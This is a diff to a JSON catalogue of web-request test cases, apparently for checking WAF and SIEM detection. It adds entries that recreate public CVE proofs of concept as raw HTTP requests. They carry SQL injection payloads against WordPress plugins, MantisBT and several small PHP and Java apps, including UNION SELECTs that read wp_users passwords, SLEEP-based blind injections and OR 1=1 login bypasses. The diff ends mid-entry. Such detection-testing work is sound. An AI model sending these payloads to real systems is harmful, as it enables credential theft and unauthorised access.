@@ -415359,6 +415359,325 @@
     "visible": true
   },
   {
+    "name": "CVE-2021-24520 - Stock in & out WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24520 - Stock in & out WordPress Plugin SQL Injection",
+    "description": "The Stock in & out WordPress plugin through 1.0.4 lacks sanitisation before passing the product_id GET parameter into an SQL statement on the admin.php?page=stock_in page (tab=history), allowing a Contributor+ user to perform SQL injection. This request sends a UNION SELECT payload in product_id, matching the WPScan PoC. Method/path from the WPScan PoC (GET). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/f903aadd-17af-4ddf-8635-abb3338ac815 (WPScan advisory + PoC)\n- https://github.com/pang0lin/CVEproject/blob/main/wordpress_Stock-in-and-out_sqli.md (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24520 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=stock_in&product_id=0%20union%20select%201,2,3,user(),database()--%20-&tab=history HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in_dummy=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24520"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24520",
+        "link": "https://wpscan.com/vulnerability/f903aadd-17af-4ddf-8635-abb3338ac815"
+      },
+      {
+        "title": "poc_github for CVE-2021-24520",
+        "link": "https://github.com/pang0lin/CVEproject/blob/main/wordpress_Stock-in-and-out_sqli.md"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24511 - Product Feed on WooCommerce WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24511 - Product Feed on WooCommerce WordPress Plugin SQL Injection",
+    "description": "The Product Feed on WooCommerce (purple-xmls-google-product-feed-for-woocommerce) WordPress plugin before 3.3.1.0 does not sanitise the product_id POST parameter of the cpf_cart_product admin-ajax action before using it in SQL, leading to SQL injection. This request sends a time-based (SLEEP) payload in product_id to /wp-admin/admin-ajax.php, matching the WPScan PoC. Method POST per PoC. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/0fa114a0-29df-4312-9138-eb9f0aedb3c5 (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-purple-xmls-google-product-feed-for-woocommerce/ (disclosure)\n- https://www.cve.org/CVERecord?id=CVE-2021-24511 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in_dummy=dummy\n\nkeyword=eewr&searchfilters=sku&security=dummy&action=cpf_cart_product&feedpath=core%2Fajax%2Fwp%2Ffetch_product_ajax.php&q=savep&local_cat_ids=1&product_id=1%20AND%20(SELECT%207403%20FROM%20(SELECT(SLEEP(5)))gJUc)\n"
+    },
+    "cves": [
+      "CVE-2021-24511"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24511",
+        "link": "https://wpscan.com/vulnerability/0fa114a0-29df-4312-9138-eb9f0aedb3c5"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24507 - Astra Pro Addon WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24507 - Astra Pro Addon WordPress Plugin SQL Injection",
+    "description": "The Astra Pro Addon WordPress plugin before 3.5.2 does not sanitise some POST parameters of the astra_pagination_infinite / astra_shop_pagination_infinite admin-ajax actions (available unauthenticated) before using them in SQL. The payload is injected in the query_vars JSON value (tax_query->terms). This request sends a UNION SELECT in query_vars to /wp-admin/admin-ajax.php, matching the WPScan advisory. Method POST per advisory. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/a1a0dc0b-c351-4d46-ac9b-b297ce4d251c (WPScan advisory + PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24507 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=astra_pagination_infinite&page_no=1&nonce=dummy&astra_infinite=astra_pagination_ajax&query_vars=%7B%22tax_query%22%3A%5B%7B%22taxonomy%22%3A%22category%22%2C%22field%22%3A%22term_id%22%2C%22terms%22%3A%221%20UNION%20SELECT%201%2C2%2C3%2C4%2C5--%20-%22%7D%5D%7D\n"
+    },
+    "cves": [
+      "CVE-2021-24507"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24507",
+        "link": "https://wpscan.com/vulnerability/a1a0dc0b-c351-4d46-ac9b-b297ce4d251c"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24506 - Slider Hero WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24506 - Slider Hero WordPress Plugin SQL Injection",
+    "description": "The Slider Hero WordPress plugin before 8.2.7 does not sanitise the id attribute of its [hero-button] shortcode before using it in SQL, allowing a Contributor+ user to perform SQL injection when the shortcode is rendered. This is the storing request: it saves a post (via /wp-admin/post.php) whose content contains the [hero-button] shortcode with a UNION SELECT in the id attribute. METHOD AND PATH INFERRED: WPScan gives no HTTP request (shortcode saved in post content); POST /wp-admin/post.php (action=editpost) is the standard WordPress post-save endpoint that stores the shortcode. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/52c8755c-46b9-4383-8c8d-8816f03456b0 (WPScan advisory + PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24506 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/post.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in_dummy=dummy\n\naction=editpost&post_ID=1&_wpnonce=dummy&content=%5Bhero-button%20id%3D%27-1%20UNION%20SELECT%20user_login%2Cuser_pass%20FROM%20wp_users--%20-%27%5D\n"
+    },
+    "cves": [
+      "CVE-2021-24506"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24506",
+        "link": "https://wpscan.com/vulnerability/52c8755c-46b9-4383-8c8d-8816f03456b0"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24497 - Giveaway WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24497 - Giveaway WordPress Plugin SQL Injection",
+    "description": "The Giveaway WordPress plugin through 1.2.2 is vulnerable to SQL injection via the options[post] POST parameter on the plugin settings (/wp-admin/options.php, Settings -> Giveaway). This request sends a time-based (SLEEP) payload in options[post], matching the WPScan PoC. Method POST per PoC. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/a1cf08fe-943a-4f14-beb0-25216011b538 (WPScan advisory + PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24497 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/options.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in_dummy=dummy\n\noption_page=giveaway&action=update&_wpnonce=dummy&options%5Bpost%5D=%28select%2Afrom%28select%28sleep%2810%29%29%29a%29\n"
+    },
+    "cves": [
+      "CVE-2021-24497"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24497",
+        "link": "https://wpscan.com/vulnerability/a1cf08fe-943a-4f14-beb0-25216011b538"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24492 - Handsome Testimonials & Reviews WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24492 - Handsome Testimonials & Reviews WordPress Plugin SQL Injection",
+    "description": "The Handsome Testimonials & Reviews WordPress plugin before 2.1.1 does not sanitise the hndtst_previewShortcodeInstanceId POST parameter of the hndtst_previewShortcodeInstance admin-ajax action (available to any authenticated user) before using it in SQL. This request sends a UNION ALL SELECT payload in hndtst_previewShortcodeInstanceId to /wp-admin/admin-ajax.php, matching the WPScan PoC (PoC action name used over the description). Method POST per PoC. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/42760007-0e59-4d45-8d64-86bc0b8dacea (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-handsome-testimonials/ (disclosure)\n- https://www.cve.org/CVERecord?id=CVE-2021-24492 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\nCookie: wordpress_logged_in_dummy=dummy\n\naction=hndtst_previewShortcodeInstance&hndtst_previewShortcodeInstanceId=-1%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9--%20-\n"
+    },
+    "cves": [
+      "CVE-2021-24492"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24492",
+        "link": "https://wpscan.com/vulnerability/42760007-0e59-4d45-8d64-86bc0b8dacea"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24465 - Meow Gallery WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24465 - Meow Gallery WordPress Plugin SQL Injection",
+    "description": "The Meow Gallery WordPress plugin before 4.1.9 does not sanitise the ids attribute of its [gallery] shortcode (available to Contributor+) before using it in SQL. This is the storing request: it saves a post (via /wp-admin/post.php) whose content contains the [gallery] shortcode with a UNION SELECT in the ids attribute. METHOD AND PATH INFERRED: WPScan gives no HTTP request (shortcode saved in post content); POST /wp-admin/post.php (action=editpost) is the standard WordPress post-save endpoint that stores the shortcode. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/08dbe202-0136-4502-87e7-5e984dc27b16 (WPScan advisory + PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24465 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/post.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in_dummy=dummy\n\naction=editpost&post_ID=1&_wpnonce=dummy&content=%5Bgallery%20layout%3D%22cascade%22%20ids%3D%221%20UNION%20SELECT%20user_login%2Cuser_pass%20FROM%20wp_users--%20-%22%5D\n"
+    },
+    "cves": [
+      "CVE-2021-24465"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24465",
+        "link": "https://wpscan.com/vulnerability/08dbe202-0136-4502-87e7-5e984dc27b16"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2021-24460 - Ays Pro Popup Like box \u2013 Page Plugin SQL Injection",
     "displayName": "CVE-2021-24460 - Ays Pro Popup Like box \u2013 Page Plugin SQL Injection",
     "description": "Ays Pro Popup Like box \u2013 Page Plugin is vulnerable to authenticated SQL injection via the `orderby` parameter of its admin-dashboard list table (get_results() DB call, no whitelist). The request sends a time-based ORDER BY injection (SLEEP(5)) in `orderby`. The vulnerable parameter `orderby`, the GET method and the path /wp-admin/admin.php are from the WPScan PoC, which redacts the admin page slug; the slug `ays-facebook-popup-likebox` is INFERRED from the Ays Pro convention that the admin page slug equals the wordpress.org plugin slug (confirmed on the sibling plugins Quiz Maker page=quiz-maker and Portfolio Responsive Gallery page=portfolio-responsive-gallery). No vendor WAF rule found; built from the WPScan advisory.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/9c0164f2-464b-4876-a48f-c0ebd63cf397 (WPScan advisory / PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24460 (CVE record)",
@@ -418578,6 +418897,958 @@
       {
         "title": "cve_record for CVE-2026-4815",
         "link": "https://www.cve.org/CVERecord?id=CVE-2026-4815"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-28413 - MantisBT SOAP API SQL Injection",
+    "displayName": "CVE-2020-28413 - MantisBT SOAP API SQL Injection",
+    "description": "MantisBT 2.24.3 is vulnerable to blind SQL injection in the \"access\" argument of the mc_project_get_users operation of the SOAP API (/api/soap/mantisconnect.php). The request sends a time-based SQL injection payload inside the <access> element of the SOAP envelope. SOAP requests are POST by definition. No vendor WAF rule found; built from the advisory/PoC.\n\nReferences used to recreate this request:\n- http://packetstormsecurity.com/files/160750/Mantis-Bug-Tracker-2.24.3-SQL-Injection.html (PoC, PoW-walled)\n- https://ethicalhcop.medium.com/cve-2020-28413-blind-sql-injection-en-mantis-bug-tracker-2-24-3-api-soap-54238f8e046d (write-up)\n- https://www.cve.org/CVERecord?id=CVE-2020-28413 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /api/soap/mantisconnect.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: text/xml; charset=utf-8\nSOAPAction: \"mc_project_get_users\"\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:man=\"http://futureware.biz/mantisconnect\">\n<soapenv:Body>\n<man:mc_project_get_users>\n<username>administrator</username>\n<password>dummy</password>\n<project_id>1</project_id>\n<access>0 AND (SELECT 1 FROM (SELECT SLEEP(5))x)</access>\n</man:mc_project_get_users>\n</soapenv:Body>\n</soapenv:Envelope>\n"
+    },
+    "cves": [
+      "CVE-2020-28413"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_packetstorm for CVE-2020-28413",
+        "link": "http://packetstormsecurity.com/files/160750/Mantis-Bug-Tracker-2.24.3-SQL-Injection.html"
+      },
+      {
+        "title": "writeup for CVE-2020-28413",
+        "link": "https://ethicalhcop.medium.com/cve-2020-28413-blind-sql-injection-en-mantis-bug-tracker-2-24-3-api-soap-54238f8e046d"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-28183 - SourceCodester Water Billing System SQL Injection",
+    "displayName": "CVE-2020-28183 - SourceCodester Water Billing System SQL Injection",
+    "description": "SourceCodester Water Billing System 1.0 is vulnerable to SQL injection via the username parameter of /wbs/process.php, allowing authentication bypass. The request sends a boolean-based SQLi payload in the username form field. Path and parameters confirmed by the sartlabs/0days PoC (raw request POST /wbs/process.php, body username=...&password=...). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/sartlabs/0days/tree/main/WBS (PoC)\n- https://www.exploit-db.com/exploits/49032 (Exploit-DB)\n- https://www.cve.org/CVERecord?id=CVE-2020-28183 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wbs/process.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'+OR+1%3D1--+-&password=dummy\n"
+    },
+    "cves": [
+      "CVE-2020-28183"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-28183",
+        "link": "https://github.com/sartlabs/0days/tree/main/WBS"
+      },
+      {
+        "title": "poc_exploitdb for CVE-2020-28183",
+        "link": "https://www.exploit-db.com/exploits/49032"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-28172 - SourceCodester Simple College Website SQL Injection",
+    "displayName": "CVE-2020-28172 - SourceCodester Simple College Website SQL Injection",
+    "description": "SourceCodester Simple College Website 1.0 allows unauthenticated admin authentication bypass via SQL injection in the username parameter of /college_website/admin/ajax.php?action=login. The request POSTs username=admin' or 1=1# . Path and parameters confirmed by the yunaranyancat/poc-dump PoC. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/yunaranyancat/poc-dump/blob/main/simplecollegewebsite/sqli_rce.py (PoC)\n- https://dl.packetstormsecurity.net/2010-exploits/simplecollegewebsite10-sqlexec.txt (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-28172 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /college_website/admin/ajax.php?action=login HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'+or+1%3D1%23&password=hacked\n"
+    },
+    "cves": [
+      "CVE-2020-28172"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-28172",
+        "link": "https://github.com/yunaranyancat/poc-dump/blob/main/simplecollegewebsite/sqli_rce.py"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-28138 - SourceCodester Online Clothing Store SQL Injection",
+    "displayName": "CVE-2020-28138 - SourceCodester Online Clothing Store SQL Injection",
+    "description": "SourceCodester Online Clothing Store 1.0 is vulnerable to SQL injection via the txtUserName parameter of login.php. The request POSTs a boolean-based SQLi payload in txtUserName. Parameter name taken directly from the CVE/Exploit-DB description; HTTP method POST inferred from the login form. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/48429 (Exploit-DB PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-28138 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\ntxtUserName=admin'+OR+1%3D1--+-&txtPassword=dummy\n"
+    },
+    "cves": [
+      "CVE-2020-28138"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2020-28138",
+        "link": "https://www.exploit-db.com/exploits/48429"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-28133 - SourceCodester Simple Grocery Store Sales And Inventory System SQL Injection",
+    "displayName": "CVE-2020-28133 - SourceCodester Simple Grocery Store Sales And Inventory System SQL Injection",
+    "description": "SourceCodester Simple Grocery Store Sales And Inventory System 1.0 allows authentication bypass via SQL injection in the web login at sales_inventory/login.php. The request POSTs a boolean-based SQLi payload in the username login field. Endpoint path taken from the CVE description; the username login parameter and POST method are inferred from the standard SourceCodester login form (consistent with sibling CVE-2020-28172/28183). No vendor WAF rule found; only Exploit-DB PoC which is not directly retrievable.\n\nReferences used to recreate this request:\n- https://www.exploit-db.com/exploits/48879 (Exploit-DB PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-28133 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /sales_inventory/login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nusername=admin'+OR+1%3D1--+-&password=dummy\n"
+    },
+    "cves": [
+      "CVE-2020-28133"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_exploitdb for CVE-2020-28133",
+        "link": "https://www.exploit-db.com/exploits/48879"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-28103 - cscms page_del SQL Injection",
+    "displayName": "CVE-2020-28103 - cscms page_del SQL Injection",
+    "description": "cscms v4.1 is vulnerable to time-based SQL injection in the page_del function (plugins/sys/admin/label.php) via the id parameter, routed at /admin.php/Label/page_del. The request sends a time-based SQLi payload in id. Vulnerable function, parameter and route confirmed by the chshcms/cscms GitHub issue PoC. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/8 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-28103 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/Label/page_del HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid=1'+AND+SLEEP(5)--+-\n"
+    },
+    "cves": [
+      "CVE-2020-28103"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-28103",
+        "link": "https://github.com/chshcms/cscms/issues/8"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-28102 - cscms js_del SQL Injection",
+    "displayName": "CVE-2020-28102 - cscms js_del SQL Injection",
+    "description": "cscms v4.1 is vulnerable to time-based SQL injection in the js_del function (plugins/sys/admin/label.php) via the id parameter, routed at /admin.php/Label/js_del. The request sends a time-based SQLi payload in id. Vulnerable function, parameter and route confirmed by the chshcms/cscms GitHub issue PoC. No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/chshcms/cscms/issues/9 (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-28102 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /admin.php/Label/js_del HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: cscms_admin_id=dummy; cscms_session=dummy\n\nid=1'+AND+SLEEP(5)--+-\n"
+    },
+    "cves": [
+      "CVE-2020-28102"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-28102",
+        "link": "https://github.com/chshcms/cscms/issues/9"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-28091 - cxuucms SQL Injection",
+    "displayName": "CVE-2020-28091 - cxuucms SQL Injection",
+    "description": "cxuucms v3 is vulnerable to SQL injection via the keywords parameter of search.php, leaking database data. The request sends a UNION-based SQLi payload in the keywords query parameter. Endpoint and parameter taken from the CVE description/PoC; GET method inferred (search request). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/cbkhwx/cxuucmsv3/issues/1 (PoC)\n- http://packetstormsecurity.com/files/160129/xuucms-3-SQL-Injection.html (PoC)\n- https://www.cve.org/CVERecord?id=CVE-2020-28091 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /search.php?keywords=test%27%20UNION%20SELECT%201,2,3,4,5--%20- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2020-28091"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-28091",
+        "link": "https://github.com/cbkhwx/cxuucmsv3/issues/1"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-28087 - jeecg-boot loadTreeData SQL Injection",
+    "displayName": "CVE-2020-28087 - jeecg-boot loadTreeData SQL Injection",
+    "description": "jeecg-boot 2.3 is vulnerable to SQL injection in the /jeecg-boot/sys/dict/loadTreeData endpoint (SysDictController#loadTreeData), which builds SQL from the pid/pidField/tableName request parameters without sanitization. The request sends a time-based SQLi payload in the pid parameter. Endpoint, parameters and GET method confirmed from the jeecg-boot source (RequestMethod.GET). No vendor WAF rule found.\n\nReferences used to recreate this request:\n- https://github.com/zhangdaiscott/jeecg-boot/issues/1887 (PoC issue)\n- https://www.cve.org/CVERecord?id=CVE-2020-28087 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /jeecg-boot/sys/dict/loadTreeData?pid=1%20AND%20SLEEP(5)&pidField=id&tableName=sys_user HTTP/1.1\nHost: {{target_host}}\nX-Access-Token: dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-28087"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2020-28087",
+        "link": "https://github.com/zhangdaiscott/jeecg-boot/issues/1887"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27241 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27241 - OpenClinic GA SQL Injection",
